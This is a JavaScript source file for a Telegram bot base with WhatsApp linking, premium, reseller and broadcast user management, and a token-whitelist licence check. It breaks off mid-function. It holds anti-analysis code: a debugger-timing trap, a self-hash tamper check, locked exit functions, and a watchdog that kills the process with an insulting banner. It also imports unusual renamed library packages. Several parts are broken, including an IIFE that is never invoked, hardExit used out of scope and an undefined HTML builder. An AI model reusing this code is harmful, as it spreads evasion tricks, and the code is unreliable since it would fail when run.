//Base Rich By @mkloytiem
import { Telegraf, RichMessage, Markup, 
session } from '@icanseeuanywhere/telekaf'
import fs from "fs";
import path from "path";
import https from "https";
import moment from "moment-timezone";
import {
  makeWASocket, 
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  fetchLatestWaWebVersion,
  DisconnectReason,
  getContentType,
  jidDecode, 
  generateWAMessage, 
  generateWAMessageFromContent,
  fetchLatestBaileysVersion, 
} from "@bellachu/litebails";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import readline from "readline";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
import crypto from "crypto";
import mongoose from "mongoose";
const sessionPath = './session';
let bots = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./Database/prem.json";
const adminFile = "./Database/edmin.json";
let secureMode = false;

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Global access mode: /free enables access for every private-DM user;
// /freeoff returns the bot to premium-only access.
const accessModeFile = "./Database/accessMode.json";
const loadAccessMode = () => {
  try {
    if (!fs.existsSync(accessModeFile)) return false;
    return Boolean(loadJSON(accessModeFile)?.freeMode);
  } catch {
    return false;
  }
};
const saveAccessMode = (freeMode) => {
  fs.writeFileSync(accessModeFile, JSON.stringify({ freeMode: Boolean(freeMode) }, null, 2));
};
let freeMode = loadAccessMode();

const timedPremiumFile = "./Database/timedPremium.json";
const loadTimedPremium = () => {
  const data = loadJSON(timedPremiumFile);
  return data && typeof data === "object" && !Array.isArray(data) ? data : {};
};
const saveTimedPremium = (data) => saveJSON(timedPremiumFile, data);
const hasTimedPremium = (userId) => {
  const id = String(userId);
  const data = loadTimedPremium();
  const expiry = Number(data[id] || 0);
  if (expiry > Date.now()) return true;
  if (Object.prototype.hasOwnProperty.call(data, id)) {
    delete data[id];
    saveTimedPremium(data);
  }
  return false;
};
const grantTimedPremium = (userId, days) => {
  const data = loadTimedPremium();
  const id = String(userId);
  data[id] = Math.max(Number(data[id] || 0), Date.now()) + Number(days) * 86400000;
  saveTimedPremium(data);
  return data[id];
};


const resellerFile = "./Database/reseller.json";
const broadcastUsersFile = "./Database/users.json";
let resellerUsers = loadJSON(resellerFile);
let broadcastUsers = loadJSON(broadcastUsersFile);
if (!Array.isArray(resellerUsers)) resellerUsers = [];
if (!Array.isArray(broadcastUsers)) broadcastUsers = [];

const registerBroadcastUser = (ctx) => {
  const userId = ctx.from?.id?.toString();
  if (!userId || !ctx.chat || ctx.chat.type !== "private") return;
  if (!broadcastUsers.some(u => String(u.id || u) === userId)) {
    broadcastUsers.push({
      id: userId,
      username: ctx.from.username ? `@${ctx.from.username}` : null,
      firstName: ctx.from.first_name || "",
      addedAt: new Date().toISOString(),
    });
    saveJSON(broadcastUsersFile, broadcastUsers);
  }
};


// ==================== MORE BOTS / BOT DIRECTORY ====================
// Owner-managed list of additional Telegram bots. This stores public links only;
// it does not expose or store bot tokens.
const moreBotsFile = "./Database/moreBots.json";

const loadMoreBots = () => {
  try {
    if (!fs.existsSync(moreBotsFile)) return [];
    const data = JSON.parse(fs.readFileSync(moreBotsFile, "utf8") || "[]");
    return Array.isArray(data) ? data : [];
  } catch (error) {
    console.error("Failed to load moreBots.json:", error.message);
    return [];
  }
};

const saveMoreBots = (data) => {
  fs.writeFileSync(moreBotsFile, JSON.stringify(data, null, 2));
};

const normalizeBotLink = (value) => {
  let link = String(value || "").trim();
  if (!link) return null;
  if (/^https?:\/\//i.test(link)) return link;
  link = link.replace(/^@/, "");
  if (!/^[A-Za-z0-9_]{5,32}$/.test(link)) return null;
  return `https://t.me/${link}`;
};

const addMoreBot = (name, linkOrUsername) => {
  const link = normalizeBotLink(linkOrUsername);
  if (!name || !link) return { success: false, message: "Invalid bot name or username/link." };

  const bots = loadMoreBots();
  const exists = bots.some(bot => bot.link.toLowerCase() === link.toLowerCase());
  if (exists) return { success: false, message: "That bot is already in the list." };

  bots.push({
    name: String(name).trim().slice(0, 64),
    link,
    addedAt: new Date().toISOString()
  });
  saveMoreBots(bots);
  return { success: true, bot: bots[bots.length - 1] };
};

const removeMoreBot = (index) => {
  const bots = loadMoreBots();
  const idx = Number(index) - 1;
  if (!Number.isInteger(idx) || idx < 0 || idx >= bots.length) return false;
  const removed = bots.splice(idx, 1)[0];
  saveMoreBots(bots);
  return removed;
};

const moreBotsKeyboard = () => {
  const buttons = loadMoreBots().map((bot, index) => [{
    text: `🤖 ${bot.name}`.slice(0, 64),
    url: bot.link
  }]);
  buttons.push([{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]);
  return Markup.inlineKeyboard(buttons).reply_markup;
};

const isResellerUser = (userId) => resellerUsers.includes(String(userId));
const saveResellers = () => saveJSON(resellerFile, resellerUsers);
const isStaff = (userId) => OWNER_IDS.includes(String(userId)) || adminUsers.includes(String(userId)) || isResellerUser(userId);

const broadcastAnnouncement = async (text) => {
  const recipients = broadcastUsers
    .map(u => String(u.id || u))
    .filter((id, index, arr) => id && arr.indexOf(id) === index);
  let sent = 0;
  let failed = 0;
  for (const userId of recipients) {
    try {
      await bot.telegram.sendMessage(userId, text, { parse_mode: "HTML" });
      sent++;
    } catch (error) {
      const retryAfter = Number(error?.response?.parameters?.retry_after || error?.parameters?.retry_after || 0);
      if (retryAfter > 0 && retryAfter <= 120) {
        await sleep((retryAfter + 1) * 1000);
        try {
          await bot.telegram.sendMessage(userId, text, { parse_mode: "HTML" });
          sent++;
        } catch (_) {
          failed++;
        }
      } else {
        failed++;
      }
    }
    await sleep(120);
  }
  return { sent, failed };
};

const freeAnnouncement = (enabled) => new HTML()
  .heading(1, enabled ? "🟢 FREE MODE ON" : "🔒 FREE MODE OFF")
  .divider()
  .paragraph(enabled
    ? "Free mode is now active. Enjoy the bot!"
    : "Free mode is now off. Buy premium and enjoy the bot.")
  .table([
    ["Status", enabled ? "Free access enabled" : "Premium only"],
    ["Access", enabled ? "All registered users" : "Premium users"],
    ["Contact", "@FG_MAFIAN"],
  ], { bordered: true, striped: true, hasHeader: true })
  .divider()
  .footer(enabled ? "Enjoy 😍" : "Buy premium and contact owner @FG_MAFIAN")
  .build();

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Sorry, this feature is only for owners.");
  }
  return next();
};

const checkStaff = (ctx, next) => {
  if (!isStaff(ctx.from.id)) return ctx.reply("❗ Only the owner, admin, or reseller can use this command.");
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Sorry, this feature is only for admins.");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

const checkPremiumOrGroupPremium = (ctx, next) => {
    const userId = ctx.from.id.toString();

    if (freeMode || OWNER_IDS.includes(userId) || isResellerUser(userId) || premiumUsers.includes(userId) || hasTimedPremium(userId)) {
        return next();
    }

    const msg = new HTML()
        .heading(2, "❌ ACCESS DENIED")
        .paragraph("Access only for Premium users, or while global Free Mode is enabled.")
        .divider()
        .paragraph("Owner can enable free access with /free and disable it with /freeoff.")
        .build();

    return ctx.sendRichMessage(msg);
};
// ==================== PREMIUM USER FUNCTIONS ====================
function isPremiumUser(userId) {
    return premiumUsers.includes(userId.toString()) || hasTimedPremium(userId);
}

// ==================== ADMIN FUNCTIONS ====================

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const randomImages = [
"https://files.catbox.moe/9cn40e.png",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const validateMongoUri = (uri) => {
  if (!uri || typeof uri !== 'string') {
    throw new Error('MongoDB URI must be a non-empty string');
  }
  if (!uri.startsWith('mongodb+srv://') && !uri.startsWith('mongodb://')) {
    throw new Error('Invalid MongoDB URI format. Must start with mongodb:// or mongodb+srv://');
  }
  return true;
};

const __mongoUri = process.env.MONGO_URI || config.MONGO_URI || "";

const connectMongoDB = async () => {
  if (!__mongoUri) {
    console.warn(chalk.yellow('⚠ MongoDB URI not configured; MongoDB-backed features are disabled.'));
    return false;
  }
  try {
    validateMongoUri(__mongoUri);
    await mongoose.connect(__mongoUri);
    console.log(chalk.green('✓ MongoDB connected successfully'));
    return true;
  } catch (error) {
    console.error(chalk.red('✗ MongoDB connection failed:'), error.message);
    return false;
  }
};

const WhitelistTokenSchema = new mongoose.Schema({
  tokens: [{
    tokenBot: { type: String, required: true },
    isActive: { type: Boolean, default: true },
    expiredAt: { type: Date, default: null }
  }]
});

const WhitelistToken = mongoose.model('Whitelist', WhitelistTokenSchema, 'avoidxtime');

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }
  
  // ==================== GROUP PREMIUM SYSTEM (TELEKAF) ====================

  function secure() {
    console.log(chalk.bold.yellow(`
             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);
})

global.validateToken = async (BOT_TOKEN) => {
  try {
    const whitelist = await WhitelistToken.findOne({});

    const isValid = whitelist?.tokens?.some((token) => {
      return (
        token.tokenBot === BOT_TOKEN &&
        token.isActive === true &&
        (
          token.expiredAt == null ||
          token.expiredAt > new Date()
        )
      );
    });

    if (!isValid) {
      console.log(chalk.bold.red("[SECURITY] Unauthorized or expired bot token."));
      activateSecureMode();
      return hardExit(1);
    }

    return true;
  } catch (err) {
    console.error(
      chalk.bold.red("[SECURITY] Failed to validate bot token:"),
      err.message
    );

    activateSecureMode();
    return hardExit(1);
  }
};

const question = (query) => new Promise((resolve) => {
    const rl = import('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const tokenData = await WhitelistToken.findOne({});
        const authorizedTokens = tokenData?.tokens?.map(t => t.tokenBot) || [];
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

// Startup token whitelist validation intentionally disabled.
// The bot starts with the token configured in config.js.
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

bot.catch(async (error, ctx) => {
  console.error("Handled Telegram update error:", error?.message || error);
  try {
